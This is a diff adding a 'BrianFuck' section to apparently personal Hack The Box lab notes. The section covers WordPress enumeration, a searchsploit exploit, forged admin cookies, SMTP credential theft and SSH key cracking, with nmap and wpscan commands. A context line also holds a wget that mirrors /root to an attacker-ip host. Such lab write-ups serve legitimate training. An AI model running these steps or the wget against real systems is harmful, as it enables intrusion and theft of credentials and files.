@@ -377,3 +377,39 @@ generate an ssh-key & rename id_rsa.pub to be authorized_keys
 sudo wget -P -nH /root/ -m <attacker-ip>:8000
  
 ```
+
+## 8.BrianFuck
+
+### Approach Taken
+- run nmap, go to website, observer certs and hit the urls
+- run wpscan
+- use searchsploit and get the exploit working
+- use the email in the form & start a webserver and make a request to the target.
+- you can intercept that request and you can see the webserver responding to the client to set cookies which are valid admin cookies and that will help you login as admin user
+- see if you can edit any .php files via the templating engines. Dashboard -> Apperance -> Editor
+- Look out for SMTP related updates in the settings section and you can find the user and his password, use the inspect tool and copy the password
+- You have got the mail creds, download a SMTP client.
+- Configure the mail client and get the email and get more creds
+- Login to the SuperSecret Website
+- Follow the pages and crack SSH keys with Rumkin Cipher https://rumkin.com/tools/cipher/vigenere/
+- get the id_rsa file and ssh with orestis user
+- crack the ssh key using john  
+
+### Lessons Learnt
+- Explore certificate details & check out for email addressess
+- The web server may render the website content based on URL you are hitting, so update your /etc/hosts and try logging into all the URL's
+- rumkin ciphers (vigenere)
+
+### Commands Used
+```
+nmap -sC -sV -oA nmap 10.10.10.17
+
+wpscan -u https://brianfuck.htb --disable-tls-checks
+
+wpscan -u https://brianfuck.htb --disable-tls-checks --enumerate u
+
+searchsploit WP Support Plus
+
+searchsploit -x 40001.txt
+
+```
